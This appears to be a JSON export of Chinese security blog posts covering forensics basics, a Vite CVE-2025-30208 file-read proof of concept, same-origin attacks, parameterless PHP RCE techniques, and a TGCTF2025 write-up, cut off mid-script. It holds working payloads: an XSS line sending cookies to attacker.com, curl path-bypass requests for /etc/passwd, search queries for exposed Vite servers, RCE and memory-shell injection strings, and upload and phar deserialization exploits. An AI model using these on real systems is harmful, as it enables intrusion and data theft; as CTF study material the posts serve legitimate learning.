[{"title":"数据取证-1day","url":"/2025/04/14/%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81-1day/","content":"初探取证电子数据取证专业名词术语临时文件计算机使用过程中产生的临时数据，这些临时文件有时也可以给我们的调查提供一些线索\n系统临时文件C:\\Windows\\Temp\\*.tmpIE访问临时文件C:\\Documents and Settings\\Username\\Local Settings\\Temporary Internet Filesoffice文档编辑时产生的临时文件C:\\Documnets and Settings\\Administrator\\Application Data\\Microsoft\\Word\n\n历史记录是指多数计算机程序在运行的过程中产生的 记录信息\n在浏览器中，历史记录是指浏览器曾经访问过的网站在计算机中存在的信息iis访问日志记录服务器的一些状况和访问ip的来源和登录情况等\n\n未分配簇是指哪些在当前文件系统中没有被分配的空间，数据恢复就是从将那些在磁盘上已删除的文件但空间地址未被覆盖，\n在这里讲一下数据恢复的概念\n比如你有一个文件，但是现在你把他删除了，你表面上是看不到这个文件了，但其实是这个文件隐藏起来了，文件资源管理器会对电脑发出指令，这个文件的内存地址我不需要了，你爱咋咋地，也就是后面新来的数据会直接覆盖在上面，如果被删除的文件的内存地址尚未被覆盖，那么就可以使用恢复工具进行恢复\n\n未分配簇中可能包含大量重要的证据信息，只要数据未被覆盖，可以通过相关技术检索到或直接恢复，这是非常重要的\n可以在取证软件中查看未分配簇内容，包含曾经被删除的数据\n文件残留区文件残留区是指文件逻辑大小到物理大小末尾之间的数据\n|---------------------------------------|----------------||&lt;--------------逻辑大小----------------&gt;|&lt;----文件残留区-&gt;||&lt;--------------------------物理大小---------------------&gt;|\n\n簇：文件储存的最小单位，簇是有多个扇区组成\n隐藏文件的方式\n硬盘加密，压缩包加密，bitlocker加密，office文件加密，虚拟容器加密，修改文件拓展名，EFS文件加密，信息隐写","categories":["取证"],"tags":["取证"]},{"title":"CVE-2025-30208","url":"/2025/04/14/CVE-2025-30208/","content":"CVE-2025-30208也是今天打题的时候，遇到的一个特别有意思的服务器漏洞，在这里记录一下，利用难度也不是很大\n漏洞简介CVE-2025-30208 是 Vite 开发服务器中的一个任意文件读取漏洞。该漏洞允许攻击者通过特定的 URL 参数绕过访问控制，从而读取服务器上的敏感文件（如 /etc/passwd 或 C:\\windows\\win.ini）。\n该漏洞主要影响以下版本的 Vite：\n6.2.3 之前6.1.2 之前6.0.12 之前5.4.15 之前4.5.10 之前\n漏洞原理Vite 开发服务器提供 @fs 机制，用于防止访问 Vite 允许列表之外的文件。然而，由于 URL 解析时的正则表达式处理不当，攻击者可以通过 ?raw?? 或 ?import&amp;raw?? 等查询参数绕过访问限制，从而读取任意文件。\n详细分析在 Vite 服务器的 URL 处理逻辑中，@fs 机制原本用于限制对非白名单目录的访问，例如：\nserver: {  fs: {    allow: [path.resolve(__dirname, 'src')]  }}\n\n然而，Vite 在 URL 解析过程中会移除部分特殊字符，而未正确考虑查询参数的影响，导致攻击者可以构造类似如下的请求绕过安全检查：\nGET /@fs/etc/passwd?raw??GET /@fs/etc/passwd?import&amp;raw??\n\n由于 Vite 解析 URL 时未正确处理这些参数，导致绕过 server.fs.allow 限制，并返回任意文件内容。\n漏洞利用Fofa &amp; Hunter 搜索攻击者可使用以下测绘语句搜索可能受影响的 Vite 服务器：\nFofa:body=\"/@vite/client\"Hunter:web.body=\"/@vite/client\"PoC（概念验证）启动 Vite 服务器：$ npm create vite@latest$ cd vite-project/$ npm install$ npm run dev创建测试文件：$ echo \"top secret content\" &gt; /tmp/secret.txt发送漏洞利用请求：### \n\n正常情况下被拒绝$ curl \"http://localhost:5173/@fs/tmp/secret.txt\"\n\n绕过访问控制$ curl \"http://localhost:5173/@fs/tmp/secret.txt?import&amp;raw??\"export default \"top secret content\\n\"漏洞验证GET /etc/passwd?import&amp;raw?? HTTP/1.1Host: ********","categories":["web"],"tags":["cve"]},{"title":"同源策略攻防","url":"/2025/04/14/%E5%90%8C%E6%BA%90%E7%AD%96%E7%95%A5%E6%94%BB%E9%98%B2/","content":"同源策略及其攻防详解1. 同源策略的定义与作用同源策略是由Netscape提出的一种安全策略，用于限制不同源（协议、域名、端口）的文档或脚本如何与另一个源的资源进行交互。只有当协议、域名和端口完全相同时，才被认为是同源。\n作用：\n\n保护用户数据安全，防止不同源的脚本访问或修改当前页面的敏感数据。\n防止敏感数据泄露，限制跨域请求。\n防止跨站脚本攻击（XSS）和跨站请求伪造（CSRF）等安全威胁。\n\n2. 与同源策略相关的攻击（1）跨站脚本攻击（XSS）原理：攻击者通过注入恶意JavaScript代码，使其在用户浏览器中执行，窃取用户敏感信息或篡改页面内容。\n案例：在一个论坛的留言板功能中，如果未对用户输入进行严格过滤，攻击者可以在留言框中输入以下代码：\n&lt;script&gt;document.location=&#x27;http://attacker.com?cookie=&#x27;+document.cookie&lt;/script&gt;\n\n当其他用户访问该留言页面时，这段恶意脚本会被执行，将用户的cookie信息发送到攻击者的服务器。\n与同源策略的关系：XSS攻击利用网站漏洞，使得恶意脚本在同源页面中执行，绕过同源策略的限制。\n（2）跨站请求伪造（CSRF）原理：攻击者利用用户已登录的状态，伪造请求，执行未经授权的操作。\n案例：假设银行网站的转账操作URL为：\nhttp://bank.com/transfer?to=123456&amp;amount=1000\n\n攻击者可以在一个恶意页面中创建一个隐藏的链接或按钮，链接指向上述URL。当用户在已登录银行网站的状态下访问该恶意页面并点击链接时，资金可能被转走。\n与同源策略的关系：CSRF攻击通过诱导用户点击恶意链接，绕过同源策略对跨域请求的部分限制。\n（3）点击劫持（Clickjacking）原理：攻击者通过透明iframe等手段，诱导用户点击，执行恶意操作。\n案例：在一个看似普通的图片页面中，攻击者可能隐藏一个透明的iframe，用户点击图片时，实际触发了iframe中的恶意链接。\n与同源策略的关系：点击劫持利用用户的视觉错觉，绕过同源策略对页面交互操作的限制。\n3. 基于同源策略的防御措施（1）针对XSS攻击\nHttpOnly属性：禁止JavaScript访问带有HttpOnly属性的cookie，防止cookie被XSS攻击窃取。例如，在服务器端设置cookie时使用以下代码（以PHP为例）：\nsetcookie(&#x27;user_id&#x27;, $user_id, time() + 3600, &#x27;/&#x27;, &#x27;&#x27;, false, true);\n\n其中最后一个参数true表示设置了HttpOnly属性。\n\n输入输出检查：对用户输入进行严格过滤，对输出进行编码。例如，过滤掉特殊符号如&lt;、&gt;等，并在输出时将其编码为&lt;、&gt;。\n\n\n（2）针对CSRF攻击\n验证码：增加用户操作的验证步骤，防止攻击者伪造请求。\nReferer检查：验证请求来源是否为同源，拒绝非同源请求。\nToken机制：在请求中加入随机Token，确保请求的合法性。\n\n（3）针对点击劫持\nX-Frame-Options：通过HTTP头限制页面被嵌入iframe，防止点击劫持。\n禁止跨域iframe：通过JavaScript代码防止页面被嵌套在恶意iframe中。\n\n4. 总结同源策略是Web安全的重要基石，通过限制不同源之间的交互，有效保护用户数据和隐私。然而，攻击者可能利用漏洞绕过同源策略，因此开发者需要采取多种防御措施，如输入验证、输出编码、使用安全的Cookie属性等，以增强Web应用的安全性。\n","categories":["web"],"tags":["web"]},{"title":"无参数rce","url":"/2025/04/14/%E6%97%A0%E5%8F%82%E6%95%B0rce/","content":"无参数rce这是今天打tgctf2025题的时候，遇到的问题，秉持着遇到问题就解决的思想，写下这篇博客，系统的研究无参数rce，废话不多说\n什么是无参数就是使用函数的时候不能带有参数，具体来说就是各种函数的嵌套，利用各种函数的返回值\n常见函数目录操作：getchwd() ：函数返回当前工作目录。scandir() ：函数返回指定目录中的文件和目录的数组。dirname() ：函数返回路径中的目录部分。chdir() ：函数改变当前的目录。数组相关的操作：end() - 将内部指针指向数组中的最后一个元素，并输出。next() - 将内部指针指向数组中的下一个元素，并输出。prev() - 将内部指针指向数组中的上一个元素，并输出。reset() - 将内部指针指向数组中的第一个元素，并输出。each() - 返回当前元素的键名和键值，并将内部指针向前移动。array_shift() - 删除数组中第一个元素，并返回被删除元素的值。读文件show_source() - 对文件进行语法高亮显示。readfile() - 输出一个文件。highlight_file() - 对文件进行语法高亮显示。file_get_contents() - 把整个文件读入一个字符串中。readgzfile() - 可用于读取非 gzip 格式的文件\n\ngetallheaders()这个函数的作用是获取http所有的头部信息，也就是headers，然后我们可以用var_dump把它打印出来，但这个有个限制条件就是必须在apache的环境下可以使用，其它环境都是用不了的\nplaintext?code=print_r(getallheaders()); \n\n数组会返回 HTTP 请求头。\nget_defined_vars()getallheaders()`是有局限性的，因为如果中间件不是`apache`的话，它就用不了了，那我们就介绍一种更为普遍的方法`get_defined_vars()`，这种方法其实和上面那种方法原理是差不多的，它并不是获取的`headers`，而是获取的四个全局变量`$_GET $_POST $_FILES $_COOKIEplaintext?code=var_dump(get_defined_vars()); \n\nvar_dump可以把返回数组打印出来。\ngetenv()获取环境变量的值(在PHP7.1之后可以不给予参数)适用于：php7以上的版本\nplaintext?code=var_dump(getenv());\n\nphp7.0以下返回bool(false)\nphp7.0以上正常回显。\nplaintext?code=var_dump(getenv(phpinfo()));\n\nphpinfo()可以获取所有环境变量。\nscandir()文件读取\n查看当前目录文件名plaintextprint_r(scandir(current(localeconv())));\n\n读取当前目录文件plaintext当前目录倒数第一位文件：show_source(end(scandir(getcwd())));show_source(current(array_reverse(scandir(getcwd()))));当前目录倒数第二位文件：show_source(next(array_reverse(scandir(getcwd()))));随机返回当前目录文件：highlight_file(array_rand(array_flip(scandir(getcwd()))));show_source(array_rand(array_flip(scandir(getcwd()))));show_source(array_rand(array_flip(scandir(current(localeconv())))));\n\n查看上一级目录文件名plaintextprint_r(scandir(dirname(getcwd())));print_r(scandir(next(scandir(getcwd()))));print_r(scandir(next(scandir(getcwd()))));\n\n读取上级目录文件plaintextshow_source(array_rand(array_flip(scandir(dirname(chdir(dirname(getcwd())))))));show_source(array_rand(array_flip(scandir(chr(ord(hebrevc(crypt(chdir(next(scandir(getcwd())))))))))));show_source(array_rand(array_flip(scandir(chr(ord(hebrevc(crypt(chdir(next(scandir(chr(ord(hebrevc(crypt(phpversion())))))))))))))));\n\npayload解释：● array_flip()：交换数组中的键和值，成功时返回交换后的数组，如果失败返回 NULL。● array_rand()：从数组中随机取出一个或多个单元，如果只取出一个(默认为1)，array_rand() 返回随机单元的键名。 否则就返回包含随机键名的数组。 完成后，就可以根据随机的键获取数组的随机值。● array_flip()和array_rand()配合使用可随机返回当前目录下的文件名● dirname(chdir(dirname()))配合切换文件路径\n无参数读取文件查看当前目录\nprint_r(getcwd());\n\nprint_r(scandir(&#39;.&#39;))查看当前目录下所有文件，以数组的形式输出。\n但是要怎么构造.呢\n使用localeconv()\nlocaleconv() 函数返回一包含本地数字及货币格式信息的数组。而数组第一项就是 .\n\ncurrent() 返回数组中的单元，默认第一个值。\n所以我们输出 print_r(scandir(current(localeconv())));也会如同 print_r(scandir(&#39;.&#39;))打印当前目录下文件名。\n\n使用 print_r(scandir(pos(localeconv())));，pos是current的别名\n\nreset()函数将内部指针指向数组中的第一个元素，并输出。\n\n相关的方法：\n\ncurrent()- 返回数组中的当前元素的值\nend()- 将内部指针指向数组中的最后一个元素，并输出\nnext()- 将内部指针指向数组中的下一个元素，并输出\nprev()- 将内部指针指向数组中的上一个元素，并输出\neach()- 返回当前元素的键名和键值，并将内部指针向前移动\n\n\n\n\n查看和读取根目录文件所获得的字符串第一位有几率是&#x2F;，需要多试几次\nphpprint_r(scandir(chr(ord(strrev(crypt(serialize(array())))))));\n\ncurrent()和pos()pos()函数是current()函数的别名，两者是完全一样的，\n它的作用就是输出数组中当前元素的值，只输出值而忽略掉键，默认是数组中的第一个值。\nchdir()这个函数是用来跳目录的，有时想读的文件不在当前目录下就用这个来切换，因为scandir()会将这个目录下的文件和目录都列出来，那么利用操作数组的函数将内部指针移到我们想要的目录上然后直接用chdir切就好了，如果要向上跳就要构造chdir(&#39;..&#39;)\narray_reverse()将整个数组倒过来，有的时候当我们想读的文件比较靠后时，就可以用这个函数把它倒过来，就可以少用几个next()\nhighlight_file()打印输出或者返回 filename 文件中语法高亮版本的代码，相当于就是用来读取文件的\n查看上级目录方法一：dirname()\n从图中可以看出，如果传入的值是绝对路径（不包含文件名），则返回的是上一层路径，传入的是文件名绝对路径则返回文件的当前路径\n?code=print_r(scandir(dirname(getcwd())));\n\n方法二：构造”..”\nprint_r(scandir(next(scandir(getcwd()))));//也可查看上级目录文件next(scandir(chr(ord(hebrevc(crypt(time()))))))\n\nchdir() ：改变当前工作目录\n直接print_r(readfile(array_rand(array_flip(scandir(dirname(getcwd()))))));是不可以的，会报错，因为默认是在当前工作目录寻找并读取这个文件，而这个文件在上一层目录，所以要先改变当前工作目录\nshow_source(array_rand(array_flip(scandir(dirname(chdir(dirname(getcwd())))))));\n\n读取目录的函数\nshow_source()highlight_file()file_get_contents ()readfile()readgzfile()\n\n无参数命令执行(RCE)\n用其他变量辅佐eval传入参数\n$_POST$_GET$_FILES$_ENV$_COOKIE$_SESSION\n\ngetallheaders()\ngetallheaders()获取全部 HTTP 请求头信息\napache_response_headers() 获得全部 HTTP 响应头信息\n这就意味着我们在headers里传入参数，再用该函数进行接收即可，但是其局限性在于只能是apeach 环境下。\nget_defined_vars()\n它能获取到以下变量\n$_GET$_POST$_FILES$_COOKIE\n\n如何利用file变量进行rce呢？\nimport requestsfiles = &#123;  &quot;system(&#x27;whoami&#x27;);&quot;: &quot;&quot;&#125;#data = &#123;#&quot;code&quot;:&quot;eval(pos(pos(end(get_defined_vars()))));&quot;#&#125;r = requests.post(&#x27;http://127.0.0.1/333/222/111/index.php?code=eval(pos(pos(end(get_defined_vars()))));&#x27;, files=files)print(r.content.decode(&quot;utf-8&quot;, &quot;ignore&quot;))\n\nsession_id()\nsession_id()： 可以用来获取&#x2F;设置 当前会话 ID。\nsession需要使用session_start()开启，然后返回参数给session_id()\n但是有一点限制：文件会话管理器仅允许会话 ID 中使用以下字符：a-z A-Z 0-9 ,（逗号）和 - 减号）\n但是hex2bin()函数可以将十六进制转换为ASCII 字符，所以我们传入十六进制并使用hex2bin()即可\n（PHP5.5 -7.1.9可行）\n?code=show_source(session_id(session_start()));\n\n其他版本可考虑用hex2bin() 将十六进制形式的命令还原。\nimport requestsurl = &#x27;http://localhost/?code=eval(hex2bin(session_id(session_start())));&#x27;payload = &quot;phpinfo();&quot;.encode(&#x27;hex&#x27;)cookies = &#123;    &#x27;PHPSESSID&#x27;:payload&#125;r = requests.get(url=url,cookies=cookies)print r.content\n\ngetenv()\ngetenv() 获取一个环境变量的值（只适用于7.1以后版本）\n通过array_rand()和array_flip()结合去取我们想要的那个值，但是一般情况下php.ini中，variables_order值为：GPCS，即没有定义Environment(E)变量，无法利用。只有当其配置为EGPCS时才可利用。\n那么如何读取其他文件\n\narray_flip() 函数用于反转&#x2F;交换数组中的键名和对应关联的键值。\narray_rand() 函数返回数组中的随机键名，或者如果您规定函数返回不只一个键名，则返回包含随机键名的数组。\n\n我们可以使用array_rand(array_flip())，array_flip()是交换数组的键和值，array_rand()是随机返回一个数组。\nreadfile(array_rand(array_flip(scandir(getcwd()))));readfile(array_rand(array_flip(scandir(current(localeconve())))));\n\n如果目标文件不在当前目录呢？\n\ndirname() ：返回路径中的目录部分，\n从图中可以看出，如果传入的值是绝对路径（不包含文件名），则返回的是上一层路径，传入的是文件名绝对路径则返回文件的当前路径\n\nchdir() ：改变当前工作目录\nprint_r(scandir(dirname(getcwd()))); //查看上一级目录的文件\n\n构造”..”\nprint_r(next(scandir(getcwd())));：我们scandir(getcwd())出现的数组第二个就是”..”，所以可以用next()获取\nprint_r(scandir(next(scandir(getcwd()))));//也可查看上级目录文件\n\n结合上文的一些构造都是可以获得”..”的 ：\nnext(scandir(chr(ord(hebrevc(crypt(time()))))))\n\n读取上级目录文件\n直接 print_r(readfile(array_rand(array_flip(scandir(dirname(getcwd()))))));是不可以的，会报错，因为默认是在当前工作目录寻找并读取这个文件，而这个文件在上一层目录，所以要先改变当前工作目录,前面写到了chdir()，使用：\nshow_source(array_rand(array_flip(scandir(dirname(chdir(dirname(getcwd())))))));\n\n如果不能使用dirname()，可以使用构造”..”的方式切换路径并读取：\n但是这里切换路径后getcwd()和localeconv()不能接收参数，因为语法不允许，我们可以用之前的hebrevc(crypt(arg))\nshow_source(array_rand(array_flip(scandir(chr(ord(hebrevc(crypt(chdir(next(scandir(getcwd())))))))))));或更复杂的：show_source(array_rand(array_flip(scandir(chr(ord(hebrevc(crypt(chdir(next(scandir(chr(ord(hebrevc(crypt(phpversion())))))))))))))));还可以用：show_source(array_rand(array_flip(scandir(chr(current(localtime(time(chdir(next(scandir(current(localeconv()))))))))))));//这个得爆破，不然手动要刷新很久，如果文件是正数或倒数第一个第二个最好不过了，直接定位\n\n还有：\nif(chdir(next(scandir(getcwd()))))show_source(array_rand(array_flip(scandir(getcwd()))));\n\n三、实战例题-[GXYCTF2019]禁止套娃这道题目打开就是一个普通的页面，经过目录扫描会发现是git源码泄露，用Githack把源码弄出来：\nphp&lt;?phpinclude &quot;flag.php&quot;;echo &quot;flag在哪里呢？&lt;br&gt;&quot;;if(isset($_GET[&#x27;exp&#x27;]))&#123;    if (!preg_match(&#x27;/data:\\/\\/|filter:\\/\\/|php:\\/\\/|phar:\\/\\//i&#x27;, $_GET[&#x27;exp&#x27;])) &#123;        if(&#x27;;&#x27; === preg_replace(&#x27;/[a-z,_]+\\((?R)?\\)/&#x27;, NULL, $_GET[&#x27;exp&#x27;])) &#123;            if (!preg_match(&#x27;/et|na|info|dec|bin|hex|oct|pi|log/i&#x27;, $_GET[&#x27;exp&#x27;])) &#123;                // echo $_GET[&#x27;exp&#x27;];                @eval($_GET[&#x27;exp&#x27;]);            &#125;            else&#123;                die(&quot;还差一点哦！&quot;);            &#125;        &#125;        else&#123;            die(&quot;再好好想想！&quot;);        &#125;    &#125;    else&#123;        die(&quot;还想读flag，臭弟弟！&quot;);    &#125;&#125;// highlight_file(__FILE__);?&gt;\n\n代码分析首先看第一行关键代码：\nplaintext!preg_match(&#x27;/data:\\/\\/|filter:\\/\\/|php:\\/\\/|phar:\\/\\//i&#x27;, $_GET[&#x27;exp&#x27;])\n\n很明显，大概意思就是不让我们用伪协议去写或者是读文件。\n然后看第二行关键代码：\nplaintext&#x27;;&#x27; === preg_replace(&#x27;/[a-z,_]+\\((?R)?\\)/&#x27;, NULL, $_GET[&#x27;exp&#x27;])\n\n再看第二个正则,中间有一个(?R)，这个式子他会递归调用当前的正则表达式，就是说会出现\\w+((?R)?)，\\w+(\\w+((?R)?))的情况，也就是无参数函数校验。\n最后第三行关键代码：\nplaintext!preg_match(&#x27;/et|na|info|dec|bin|hex|oct|pi|log/i&#x27;, $_GET[&#x27;exp&#x27;])\n\n就是屏蔽了一些函数名的关键字之类的东西。\n分析完成我们整理一下：不能用伪协议 、只能用无参数函数形式、注意函数过滤\n解题步骤首先遍历当前目录：plaintext?exp=print_r(scandir(current(localeconv())));\n\n顺利得到目录。\n方法一：可以看到flag.php是倒数第二个，那我们把它反转一下，然后再用一个next()就是flag.php这个文件了：\nplaintext?exp=print_r(next(array_reverse(scandir(current(localeconv())))));\n\n已经很接近答案了，用highlight_file读取这个文件就拿到flag了：\nplaintext?exp=highlight_file(next(array_reverse(scandir(current(localeconv())))));\n\n思路总结\nplaintextscandir(current(localeconv()))是查看当前目录加上array_reverse()是将数组反转，即Array([0]=&gt;index.php[1]=&gt;flag.php=&gt;[2].git[3]=&gt;..[4]=&gt;.)再加上next()表示内部指针指向数组的下一个元素，并输出，即指向flag.phphighlight_file()打印输出或者返回 filename 文件中语法高亮版本的代码\n\n方法二：我们已经知道了flag就在当前目录下了。array_rand()函数可以随机读取一个数组键，array_flip()又可以将数组中的键和值进行对换。用这两个函数就可以实现对flag.php的读取。最后payload如下：\nplaintext?exp=print_r(show_source(array_rand(array_flip(scandir(current(localeconv()))))));\n\n因为array_rand()的选取是随机的，所以不一定会直接出来，多刷新几次就可以了\n","categories":["web"],"tags":["web"]},{"title":"TGCTF2025复现","url":"/2025/04/17/TGCTF2025%E5%A4%8D%E7%8E%B0/","content":"TGCTF2025复现前言这次的tgctf也是一个不可多得好比赛，web总共15道，打了将近一半吧，有些题开始做的时候没什么思路，看了wp发现还是经验不足了，呜呜呜呜，想到明年就不是小登了，还要被小登创飞。\n前端game\n进入是一个前端小游戏页面，看了源码，数据报都没发现什么奇怪的地方，但是看到url栏上的#，我就知道这是一个vue前端，一般是搭配vate服务器使用的，查查这两个东西相关的漏洞，还真给我找到了，具体来说有三个相关的cve，都是文件读取漏洞\nCVE-2025-30208\n/@fs/etc/passwd?import&amp;raw??/@fs/etc/passwd?raw??/@fs/tgflagggg?import&amp;raw??/@fs/tgflagggg?raw??\n\n\n成功读取到文件\n前端gameplus升级版，没错，又是cve漏洞，还是文件读取\nCVE-2025-31486\n/etc/passwd?.svg?.wasm?init /tgflagggg?.svg?.wasm?init #这个打法，不太好猜路径curl \"http node1.tgctf.woooo.tech:32613/@fs/app/?/ / / / / /tgflagggg? import&amp;?raw\n\n\n前端game ultral没错，还是cve漏洞，\nCVE-2025-32395\n访问/@fs/tmp/获得绝对路径/app，同时给了附件看docker也能看出路径curl --request-target /@fs/app/#/ / / / / /etc/passwd http://node1.tgctf.woooo.tech:32742/curl --request-target /@fs/app/#/ / / / / /tgflagggg http://node2.tgctf.woooo.tech:31500/\n\n偷渡阴平无参数rce，可利用的方法有很多，session_id绕过waf，getheader绕过waf等等\n&lt;?php$tgctf2025=$_GET['tgctf2025'];if(!preg_match(\"/0|1|[3-9]|\\~|\\`|\\@|\\#|\\\\$|\\%|\\^|\\&amp;|\\*|\\（|\\）|\\-|\\=|\\+|\\{|\\[|\\]|\\}|\\:|\\'|\\\"|\\,|\\&lt;|\\.|\\&gt;|\\/|\\?|\\\\\\\\/i\", $tgctf2025)){//hint：你可以对着键盘一个一个看，然后在没过滤的符号上用记号笔画一下（bushieval($tgctf2025);}else{die('(╯‵□′)╯炸弹！•••*～●');}\n\n常规思路都被堵死了，\nprint_r(scandir(chr(ord(strrev(crypt(serialize(array())))))));来查看根目录下的文件，也是成功读取到flag文件在根目录下\n\npaylaod构造\ntgctf2025=readfile(end(getallheaders()));\n\n在数据报中传入/flag就可以了\n\n也可以使用\n?tgctf2025=session_start();system(hex2bin(session_id())); PHPSESSID=636174202f666c6167       cat /flag的十六进制?tgctf2025=eval(end(current(get_defined_vars())));&amp;b=system('cat /flag');\n\n偷渡阴平（复仇）&lt;?php $tgctf2025=$_GET['tgctf2025']  if(!preg_match(\"/0|1|[3-9]|\\~|\\`|\\@|\\#| $|\\%|\\^|\\&amp;|\\*|\\（|\\）|\\ \\ \\+|\\ \\ \\]|\\}|\\:|\\'|\\\"|\\,|\\ \\.|\\&gt;|\\/|\\? |\\\\\\\\|localeconv|pos|current|print|var|dump|getallheaders|get|defined|str|spli t|spl|autoload|extensions|eval|phpversion|floor|sqrt|tan|cosh|sinh|ceil|chr|di r|getcwd|getallheaders|end|next|prev|reset|each|pos|current|array|reverse|pop| rand|flip|flip|rand|content|echo|readfile|highlight|show|source|file|assert/i\" , $tgctf2025)){ hint：你可以对着键盘一个一个看，然后在没过滤的符号上用记号笔画一下（bushi } else{ die('(╯‵ □′)╯炸弹！•••*～●'); } highlight_file( FILE )\n\npayload：\n?tgctf2025=session_start();system(hex2bin(session_id()));PHPSESSID=636174202f666c6167   \n\n其他解法\n/?tgctf2025=system(implode(apache_request_headers()))\n\n熟悉的配方，熟悉的味 道pyramid内存马\nfrom pyramid.config import Configuratorfrom pyramid.request import Requestfrom pyramid.response import Responsefrom pyramid.view import view_configfrom wsgiref.simple_server import make_serverfrom pyramid.events import NewResponseimport refrom jinja2 import Environment, BaseLoadereval_globals = { #防止eval执行恶意代码    '__builtins__': {},      # 禁用所有内置函数    '__import__': None       # 禁止动态导入}def checkExpr(expr_input):    expr = re.split(r\"[-+*/]\", expr_input)    print(exec(expr_input))    if len(expr) != 2:        return 0    try:        int(expr[0])        int(expr[1])    except:        return 0    return 1def home_view(request):    expr_input = \"\"    result = \"\"    if request.method == 'POST':        expr_input = request.POST['expr']        if checkExpr(expr_input):            try:                result = eval(expr_input, eval_globals)            except Exception as e:                result = e        else:            result = \"爬！\"    template_str = 【xxx】    env = Environment(loader=BaseLoader())    template = env.from_string(template_str)    rendered = template.render(expr_input=expr_input, result=result)    return Response(rendered)if __name__ == '__main__':    with Configurator() as config:        config.add_route('home_view', '/')        config.add_view(home_view, route_name='home_view')        app = config.make_wsgi_app()    server = make_server('0.0.0.0', 9040, app)    server.serve_forever()\n\n说实话，内存马还是第一次见到，打完这个就得去好好研究一波了\n根据官方的wp来说，eval进行了严格的限制，其实是用来迷惑的，可以传入exec，是用来打内存马的\npayload：\nexpr=exec(\"config.add_route('shell_route','/17shell');config.add_view(lambda request:Response(__import__('os').popen(request.params.get('1')).read()),route_name='shell_route');app = config.make_wsgi_app()\")/17shell?1=ls /\n\n还是打不进去，暂且放在这，待我好好研究一下吧\nezuploads简单的文件上传，有点坑，dirsearch扫文件的时候，扫不出来bak后缀，还是我自己手动试出来的，下载upload.php.bak\n&lt;?phpdefine('UPLOAD_PATH', __DIR__ . '/uploads/');$is_upload = false;$msg = null;$status_code = 200; // 默认状态码为 200if (isset($_POST['submit'])) {    if (file_exists(UPLOAD_PATH)) {        $deny_ext = array(\"php\", \"php5\", \"php4\", \"php3\", \"php2\", \"html\", \"htm\", \"phtml\", \"pht\", \"jsp\", \"jspa\", \"jspx\", \"jsw\", \"jsv\", \"jspf\", \"jtml\", \"asp\", \"aspx\", \"asa\", \"asax\", \"ascx\", \"ashx\", \"asmx\", \"cer\", \"swf\", \"htaccess\");        if (isset($_GET['name'])) {            $file_name = $_GET['name'];        } else {            $file_name = basename($_FILES['name']['name']);        }        $file_ext = pathinfo($file_name, PATHINFO_EXTENSION);        if (!in_array($file_ext, $deny_ext)) {            $temp_file = $_FILES['name']['tmp_name'];            $file_content = file_get_contents($temp_file);            if (preg_match('/.+?&lt;/s', $file_content)) {                $msg = '文件内容包含非法字符，禁止上传！';                $status_code = 403; // 403 表示禁止访问            } else {                $img_path = UPLOAD_PATH . $file_name;                if (move_uploaded_file($temp_file, $img_path)) {                    $is_upload = true;                    $msg = '文件上传成功！';                } else {                    $msg = '上传出错！';                    $status_code = 500; // 500 表示服务器内部错误                }            }        } else {            $msg = '禁止保存为该类型文件！';            $status_code = 403; // 403 表示禁止访问        }    } else {        $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！';        $status_code = 404; // 404 表示资源未找到    }}// 设置 HTTP 状态码http_response_code($status_code);// 输出结果echo json_encode([    'status_code' =&gt; $status_code,    'msg' =&gt; $msg,]);\n\n一眼丁真，move_uploaded_file的函数的漏洞，仔细看源码，文件名是由传入的name的值决定的，于是只需要get传参1.php/.就能绕过后缀名检测，然后针对内容检测，我塞了100万个垃圾数据，再传个一句话，蚁剑一连，打开终端读环境变量就可以了\n火眼辩魑魅robots.txt 直接打 tgshell.php\n无过滤，直接连蚁剑\n什么文件上传？robots.txt 进去有 class.php ，简单的反序列化\n&lt;?phphighlight_file(__FILE__);error_reporting(0);class yesterday {    public $learn;    public $study=\"study\";    public $try;    public function __construct()    {        $this-&gt;learn = \"learn&lt;br&gt;\";    }    public function __destruct()    {        echo \"You studied hard yesterday.&lt;br&gt;\";        return $this-&gt;study-&gt;hard();    }}class today {    public $doing;    public $did;    public $done;    public function __construct(){        $this-&gt;did = \"What you did makes you outstanding.&lt;br&gt;\";    }    public function __call($arg1, $arg2)    {        $this-&gt;done = \"And what you've done has given you a choice.&lt;br&gt;\";        echo $this-&gt;done;        if(md5(md5($this-&gt;doing))==666){            return $this-&gt;doing();        }        else{            return $this-&gt;doing-&gt;better;        }    }}class tommoraw {    public $good;    public $bad;    public $soso;    public function __invoke(){        $this-&gt;good=\"You'll be good tommoraw!&lt;br&gt;\";        echo $this-&gt;good;    }    public function __get($arg1){        $this-&gt;bad=\"You'll be bad tommoraw!&lt;br&gt;\";    }}class future{    private $impossible=\"How can you get here?&lt;br&gt;\";    private $out;    private $no;    public $useful1;public $useful2;public $useful3;public $useful4;public $useful5;public $useful6;public $useful7;public $useful8;public $useful9;public $useful10;public $useful11;public $useful12;public $useful13;public $useful14;public $useful15;public $useful16;public $useful17;public $useful18;public $useful19;public $useful20;    public function __set($arg1, $arg2) {        if ($this-&gt;out-&gt;useful7) {            echo \"Seven is my lucky number&lt;br&gt;\";            system('whoami');        }    }    public function __toString(){        echo \"This is your future.&lt;br&gt;\";        system($_POST[\"wow\"]);        return \"win\";    }    public function __destruct(){        $this-&gt;no = \"no\";        return $this-&gt;no;    }}$evil = new yesterday();$evil -&gt; study = new today();$evil -&gt; study -&gt; doing = new future();\n\n然后会发现，不管上传什么文件都会报错，估计是有白名单，坑点，我上网找了一堆文件后缀，都不行，结果出题人说是捏造的后缀，我晕，atg，这个时候就可以直接打phar反序列化了\nphar = new Phar(\"exp.phar\"); //.phar文件$phar-&gt;startBuffering();$phar-&gt;setStub('&lt;?php __HALT_COMPILER(); ? &gt;'); //固定的$phar-&gt;setMetadata($evil); //触发的头是C1e4r类，所以传入C1e4r对象$phar-&gt;addFromString(\"exp.txt\", \"test\"); //随便写点什么生成个签名$phar-&gt;stopBuffering();\n\nfile_exist函数是会触发phar反序列化的\n\n什么文件上传？（复仇）和上一题一样的，都是phar反序列化， 不过多赘述\n直面天命\n查看源码，发现有提示/hint\n点开hint告诉我还有另一个路由，可以直接爆破，贴上脚本\nimport itertoolsimport requestsimport stringimport timefrom urllib3.exceptions import InsecureRequestWarning# 禁用SSL警告requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)def generate_routes():    \"\"\"生成所有4位小写字母的组合\"\"\"    return [''.join(chars) for chars in itertools.product(string.ascii_lowercase, repeat=4)]def scan_routes(base_url, routes, timeout=5, delay=0.1):    